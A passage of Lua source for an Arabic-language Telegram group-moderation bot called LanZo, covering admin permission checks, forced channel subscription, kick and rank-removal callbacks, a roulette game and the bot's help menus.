Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙الحساب محذوف قم بالتاكد واعد المحاوله", 1, 'md')
end
end,nil)   
end
--     Source LanZo     --
function GetCustomTitle(user_id,chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..chat_id..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then 
Status = "المالك"
elseif GetInfo.result.status == "administrator" then 
Status = "مشرف"
else
Status = false
end
if GetInfo.result.custom_title then 
aMeR = GetInfo.result.custom_title
else 
aMeR = Status
end
end
return aMeR
end
function Validity(msg,user_id) 
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..user_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.status == "creator" then
send(msg.chat_id_,msg.id_,'᥀︙مالك المجموعه')   
return false  end 
if GetInfo.result.status == "member" then
send(msg.chat_id_,msg.id_,'᥀︙مجرد عضو هنا')   
return false  end
if GetInfo.result.status == 'left' then
send(msg.chat_id_,msg.id_,'᥀︙الشخص غير موجود هنا')   
return false  end
if GetInfo.result.status == "administrator" then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
send(msg.chat_id_,msg.id_,'᥀︙صلاحيات '..GetCustomTitle(user_id,msg.chat_id_)..' هي ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙حذف الرسائل ↫ '..DEL..'\n᥀︙دعوة المستخدمين ↫ '..INV..'\n᥀︙حظر المستخدمين ↫ '..BAN..'\n᥀︙تثبيت الرسائل ↫ '..PIN..'\n᥀︙تغيير المعلومات ↫ '..EDT..'\n᥀︙اضافة مشرفين ↫ '..VIP..'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉')
end
end
end
--     Source LanZo     --
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
aMeR = GetInfo.result.bio
else 
aMeR = "لا يوجد"
end
end
return aMeR
end
--     Source LanZo     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'رب التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "معلك لربك" 
end 
return MsgText
end
--     Source LanZo     --
function aMeRmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevaMeR:get(LanZo..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source LanZo     --
function SourceCh(msg) 
local url,res = https.request('https://ccccxcc.ml/LanZo/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.ChatMember.LanZo ~= true then
Var = false
Text = "*᥀︙عذرا لاتستطيع استخدام البوت !\n᥀︙عليك الاشتراك في قناة السورس اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="᥀ 𝗟𝗮𝗻𝗭𝗼 : 𝗧𝗲𝗮𝗠 .",url="t.me/Bw5Bw"}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Var = true
end
return Var
end
--     Source LanZo     --
function ChCheck(msg)
local var = true 
if DevaMeR:get(LanZo.."aMeR:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevaMeR:get(LanZo..'aMeR:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevaMeR:get(LanZo..'aMeR:ChText') then
local ChText = DevaMeR:get(LanZo..'aMeR:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevaMeR:get(LanZo.."aMeR:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "*᥀︙عذرا لاتستطيع استخدام البوت !\n᥀︙عليك الاشتراك في القناة اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
elseif data.ok then
return var
end
else
return var
end
end
--     Source LanZo     --
function tdcli_update_callback(data)
if (data.ID == "UpdateNewCallbackQuery") then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and DevaMeR:get(LanZo..'yes'..data.sender_user_id_) == 'delyes' then
DevaMeR:del(LanZo..'yes'..data.sender_user_id_, 'delyes')
DevaMeR:del(LanZo..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙لا استطيع طرد ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "᥀︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "᥀︙البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "᥀︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم طردك من المجموعه") 
return false
end
end,nil)  
end
if DataText == '/delno' and DevaMeR:get(LanZo..'no'..data.sender_user_id_) == 'delno' then
DevaMeR:del(LanZo..'yes'..data.sender_user_id_, 'delyes')
DevaMeR:del(LanZo..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر اطردني") 
end
--     Source LanZo     --
if DataText == '/yesdel' and DevaMeR:get(LanZo..'yesdel'..data.sender_user_id_) == 'delyes' then
DevaMeR:del(LanZo..'yesdel'..data.sender_user_id_, 'delyes')
DevaMeR:del(LanZo..'nodel'..data.sender_user_id_, 'delno')
if DevaMeR:sismember(LanZo..'aMeR:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevaMeR:sismember(LanZo..'aMeR:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevaMeR:sismember(LanZo..'aMeR:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevaMeR:sismember(LanZo..'aMeR:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevaMeR:sismember(LanZo..'aMeR:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevaMeR:sismember(LanZo..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevaMeR:sismember(LanZo..'aMeR:Constructor:'..data.chat_id_, data.sender_user_id_) or DevaMeR:sismember(LanZo..'aMeR:Managers:'..data.chat_id_, data.sender_user_id_) or DevaMeR:sismember(LanZo..'aMeR:Admins:'..data.chat_id_, data.sender_user_id_) or DevaMeR:sismember(LanZo..'aMeR:VipMem:'..data.chat_id_, data.sender_user_id_) or DevaMeR:sismember(LanZo..'aMeR:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevaMeR:sismember(LanZo..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevaMeR:srem(LanZo..'aMeR:Constructor:'..data.chat_id_,data.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..data.chat_id_,data.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Admins:'..data.chat_id_,data.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..data.chat_id_,data.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevaMeR:srem(LanZo..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم تنزيلك من ↫ ⤈\n~ ( "..constructor..Managers..admins..vipmem..cleaner..donky.." ) ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙ليس لديك رتبه في البوت") 
else 
EditMsg(Chat_Id2, Msg_Id2, "᥀︙لا استطيع تنزيل ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if DevaMeR:get(LanZo.."aMeR:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر تغير المطور الاساسي") 
DevaMeR:del(LanZo.."aMeR:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevaMeR:get(LanZo.."aMeR:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
EditMsg(Chat_Id2, Msg_Id2, "᥀︙المطور الجديد ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n᥀︙تم تغير المطور الاساسي بنجاح") 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
SendText(NewDev,"᥀︙بواسطة ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n᥀︙لقد اصبحت انت مطور هذا البوت",0,'md')
end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
LANZO = NewDev,
TokenBot = TokenBot,
LanZo = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
DevaMeR:del(LanZo.."aMeR:NewDev"..data.sender_user_id_)
dofile('LanZo.lua') 
end
end
if DataText == '/nodel' and DevaMeR:get(LanZo..'nodel'..data.sender_user_id_) == 'delno' then
DevaMeR:del(LanZo..'yesdel'..data.sender_user_id_, 'delyes')
DevaMeR:del(LanZo..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevaMeR:get(LanZo.."aMeR:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevaMeR:smembers(LanZo..'aMeR:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevaMeR:del(LanZo..'aMeR:ListRolet'..data.chat_id_) 
DevaMeR:del(LanZo.."aMeR:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙*صاحب الحظ* ↫ ["..UserName.."]\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevaMeR:del(LanZo..'aMeR:ListRolet'..data.chat_id_) 
DevaMeR:del(LanZo.."aMeR:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevaMeR:del(LanZo.."aMeR:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
end
if DataText == '/ListRolet' then
local List = DevaMeR:smembers(LanZo..'aMeR:ListRolet'..data.chat_id_) 
local Text = '᥀︙قائمة الاعبين ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n' 
local Textt = '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙تم اكتمال العدد الكلي هل انت مستعد ؟'
for k, v in pairs(List) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/UnTkeed' then
if DevaMeR:sismember(LanZo..'aMeR:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevaMeR:srem(LanZo..'aMeR:Tkeed:'..Chat_Id2, data.sender_user_id_)
DeleteMessage(Chat_Id2,{[0] = MsgId2})
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ تم الغاء تقيدك من المجموعه بنجاح .")..'&show_alert=true')
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا هذا الامر لكشف الروبوت وليس لك .")..'&show_alert=true')
end 
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local aMeR = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙الكلمه ↫ "..aMeR.." تم حذفها") 
DevaMeR:del(LanZo..'aMeR:Text:GpTexts'..aMeR..data.chat_id_)
DevaMeR:srem(LanZo..'aMeR:Manager:GpRedod'..data.chat_id_,aMeR)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local aMeR = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevaMeR:smembers(LanZo..'aMeR:Text:GpTexts'..aMeR..data.chat_id_)
if DevaMeR:get(LanZo..'aMeR:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..aMeR) 
DevaMeR:del(LanZo..'aMeR:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local aMeR = DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)')
if DevaMeR:get(LanZo..'aMeR:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..aMeR) 
DevaMeR:del(LanZo..'aMeR:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevaMeR:del(LanZo..'aMeR:Text:GpTexts'..aMeR..data.chat_id_)
DevaMeR:del(LanZo..'aMeR:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevaMeR:srem(LanZo..'aMeR:Manager:GpRedod'..data.chat_id_,aMeR)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/HideHelpList:(.*)') then
local aMeR = DataText:match('/HideHelpList:(.*)')
if tonumber(aMeR) == tonumber(data.sender_user_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم اخفاء كليشة الاوامر") 
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList:(.*)') then
local aMeR = DataText:match('/HelpList:(.*)')
if tonumber(aMeR) == tonumber(data.sender_user_id_) then
local Help = DevaMeR:get(LanZo..'aMeR:Help')
local Text = [[
᥀︙اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙م1 ↫ اوامر الحمايه
᥀︙م2 ↫ اوامر الادمنيه
᥀︙م3 ↫ اوامر المدراء
᥀︙م4 ↫ اوامر المنشئين
᥀︙م5 ↫ اوامر المطورين
᥀︙م6 ↫ اوامر الاعضاء
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList1:(.*)') then
local aMeR = DataText:match('/HelpList1:(.*)')
if tonumber(aMeR) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevaMeR:get(LanZo..'aMeR:Help1')
local Text = [[
᥀︙اوامر حماية المجموعه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙قفل • فتح ↫ الروابط
᥀︙قفل • فتح ↫ المعرفات
᥀︙قفل • فتح ↫ البوتات
᥀︙قفل • فتح ↫ المتحركه
᥀︙قفل • فتح ↫ الملصقات
᥀︙قفل • فتح ↫ الملفات
᥀︙قفل • فتح ↫ الصور
᥀︙قفل • فتح ↫ الفيديو
᥀︙قفل • فتح ↫ الاونلاين
᥀︙قفل • فتح ↫ الدردشه
᥀︙قفل • فتح ↫ التوجيه
᥀︙قفل • فتح ↫ الاغاني
᥀︙قفل • فتح ↫ الصوت
᥀︙قفل • فتح ↫ الجهات
᥀︙قفل • فتح ↫ الماركداون
᥀︙قفل • فتح ↫ التكرار
᥀︙قفل • فتح ↫ الهاشتاك
᥀︙قفل • فتح ↫ التعديل
᥀︙قفل • فتح ↫ التثبيت
᥀︙قفل • فتح ↫ الاشعارات
᥀︙قفل • فتح ↫ الكلايش
᥀︙قفل • فتح ↫ الدخول
᥀︙قفل • فتح ↫ الشبكات
᥀︙قفل • فتح ↫ المواقع
᥀︙قفل • فتح ↫ الفشار
᥀︙قفل • فتح ↫ الكفر
᥀︙قفل • فتح ↫ الطائفيه
᥀︙قفل • فتح ↫ الكل
᥀︙قفل • فتح ↫ العربيه
᥀︙قفل • فتح ↫ الانكليزيه
᥀︙قفل • فتح ↫ الفارسيه
᥀︙قفل • فتح ↫ التفليش
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر حمايه اخرى ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙قفل • فتح + الامر ↫ ⤈
᥀︙التكرار بالطرد
᥀︙التكرار بالكتم
᥀︙التكرار بالتقيد
᥀︙الفارسيه بالطرد
᥀︙البوتات بالطرد
᥀︙البوتات بالتقيد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList2:(.*)') then
local aMeR = DataText:match('/HelpList2:(.*)')
if tonumber(aMeR) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevaMeR:get(LanZo..'aMeR:Help2')
local Text = [[
᥀︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الاعدادت
᥀︙تاك للكل 
᥀︙انشاء رابط
᥀︙ضع وصف
᥀︙ضع رابط
᥀︙ضع صوره
᥀︙حذف الرابط
᥀︙كشف البوتات
᥀︙طرد البوتات
᥀︙تنظيف + العدد
᥀︙تنظيف التعديل
᥀︙كللهم + الكلمه
᥀︙اسم البوت + الامر
᥀︙ضع • حذف ↫ ترحيب
᥀︙ضع • حذف ↫ قوانين
᥀︙اضف • حذف ↫ صلاحيه
᥀︙الصلاحيات • حذف الصلاحيات
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙ضع سبام + العدد
᥀︙ضع تكرار + العدد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع مميز • تنزيل مميز
᥀︙المميزين • حذف المميزين
᥀︙كشف القيود • رفع القيود
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙حذف • مسح + بالرد
᥀︙منع • الغاء منع
᥀︙قائمه المنع
᥀︙حذف قائمه المنع
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل • تعطيل ↫ الرابط
᥀︙تفعيل • تعطيل ↫ الالعاب
᥀︙تفعيل • تعطيل ↫ الترحيب
᥀︙تفعيل • تعطيل ↫ التاك للكل
᥀︙تفعيل • تعطيل ↫ كشف الاعدادات
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙طرد المحذوفين
᥀︙طرد ↫ بالرد • بالمعرف • بالايدي
᥀︙كتم • الغاء كتم
᥀︙تقيد • الغاء تقيد
᥀︙حظر • الغاء حظر
᥀︙المكتومين • حذف المكتومين
᥀︙المقيدين • حذف المقيدين
᥀︙المحظورين • حذف المحظورين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تقييد دقيقه + عدد الدقائق
᥀︙تقييد ساعه + عدد الساعات
᥀︙تقييد يوم + عدد الايام
᥀︙الغاء تقييد ↫ لالغاء التقييد بالوقت
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/Bw5Bw)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList3:(.*)') then
local aMeR = DataText:match('/HelpList3:(.*)')
if tonumber(aMeR) == tonumber(data.sender_user_id_) then
if not Admin(data) then
